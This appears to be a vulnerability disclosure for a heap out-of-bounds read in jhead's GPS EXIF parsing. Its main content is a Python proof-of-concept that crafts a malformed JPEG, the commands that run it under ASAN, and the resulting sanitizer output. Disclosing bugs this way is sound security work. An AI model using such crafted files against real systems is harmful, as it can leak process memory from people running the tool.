## Bug0: ProcessGpsInfo Heap Out-of-Bounds Read via GPS Lat/Long Components Field Less Than 3

In `ProcessGpsInfo()` in `gpsinfo.c` (lines 141-155), the `for (a=0;a<3;a++)` loop unconditionally reads three URATIONAL components (8 bytes each) for `TAG_GPS_LAT` and `TAG_GPS_LONG` without verifying that the IFD entry's `Components` field is at least 3, allowing a crafted JPEG with `Components=1` and `OffsetVal=ExifLength-8` to pass the boundary check while the loop's second and third iterations read up to 16 bytes beyond the end of the EXIF heap buffer.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct, os

OUT = "poc_input.jpg"

FMT_ASCII     = 2
FMT_LONG      = 4
FMT_URATIONAL = 5

TIFF_HDR_SIZE   = 8
IFD0_OFFSET     = 8
IFD0_ENTRIES    = 1
IFD0_SIZE       = 2 + IFD0_ENTRIES * 12 + 4   # 18 bytes

GPS_IFD_OFFSET  = IFD0_OFFSET + IFD0_SIZE      # = 26
GPS_IFD_ENTRIES = 4
GPS_IFD_SIZE    = 2 + GPS_IFD_ENTRIES * 12 + 4 # = 54

DATA_START      = GPS_IFD_OFFSET + GPS_IFD_SIZE # = 80

LON_DATA_OFFSET = DATA_START                    # = 80  (3 * 8 = 24 bytes)
LAT_DATA_OFFSET = DATA_START + 24               # = 104 (1 * 8 = 8 bytes)

EXIF_LENGTH     = LAT_DATA_OFFSET + 8           # = 112

def ifd_entry(tag, fmt, components, value_or_offset):
    return struct.pack('<HHII', tag, fmt, components, value_or_offset)

tiff = bytearray()

# TIFF header
tiff += b'II'
tiff += struct.pack('<H', 0x002A)
tiff += struct.pack('<I', IFD0_OFFSET)

# IFD0
tiff += struct.pack('<H', IFD0_ENTRIES)
tiff += ifd_entry(0x8825, FMT_LONG, 1, GPS_IFD_OFFSET)
tiff += struct.pack('<I', 0)

# GPS IFD
tiff += struct.pack('<H', GPS_IFD_ENTRIES)

lat_ref_val = struct.unpack('<I', b'N\x00\x00\x00')[0]
tiff += ifd_entry(0x0001, FMT_ASCII, 2, lat_ref_val)

# VULNERABILITY: Components=1 but loop iterates 3 times
tiff += ifd_entry(0x0002, FMT_URATIONAL, 1, LAT_DATA_OFFSET)

lon_ref_val = struct.unpack('<I', b'E\x00\x00\x00')[0]
tiff += ifd_entry(0x0003, FMT_ASCII, 2, lon_ref_val)

tiff += ifd_entry(0x0004, FMT_URATIONAL, 3, LON_DATA_OFFSET)
tiff += struct.pack('<I', 0)

# Longitude data: 3 rationals
tiff += struct.pack('<II', 10, 1)
tiff += struct.pack('<II', 0, 1)
tiff += struct.pack('<II', 0, 1)

# Latitude data: 1 rational at ExifLength-8 (last 8 bytes of TIFF)
tiff += struct.pack('<II', 40, 1)

exif_payload = b'Exif\x00\x00' + bytes(tiff)
app1_len = 2 + len(exif_payload)

jpeg  = b'\xff\xd8'
jpeg += b'\xff\xe1'
jpeg += struct.pack('>H', app1_len)
jpeg += exif_payload
jpeg += b'\xff\xd9'

with open(OUT, 'wb') as f:
    f.write(jpeg)

print(f"Written {len(jpeg)} bytes to {OUT}")
print(f"Boundary check: {LAT_DATA_OFFSET} + 8 = {LAT_DATA_OFFSET+8} <= {EXIF_LENGTH} -> PASSES")
print(f"Loop a=1 reads at offset {LAT_DATA_OFFSET+8} (OOB)")
print(f"Loop a=2 reads at offset {LAT_DATA_OFFSET+16} (OOB)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/jhead poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** exif.c:344:37: runtime error: left shift of negative value -66. The OOB read occurs at loop iteration a=1 which accesses bytes at ExifLength through ExifLength+7 (offsets 112-119) where Get32s returns an uninitialized byte value 0xBE (-66 signed) triggering the UBSAN left-shift undefined behavior. Loop iteration a=2 reads further at offsets 120-127 also outside the EXIF buffer bounds.

### Impact

An attacker can supply a crafted JPEG file with a GPS IFD entry declaring fewer than 3 URATIONAL components for latitude or longitude to trigger up to 16 bytes of heap out-of-bounds reads beyond the EXIF buffer in `ProcessGpsInfo()`. This exposes heap memory content adjacent to the EXIF allocation which may contain sensitive process data and constitutes an information disclosure vulnerability. Any invocation of jhead on an untrusted JPEG file reaches this code path making the attack surface as broad as the tool's typical usage.
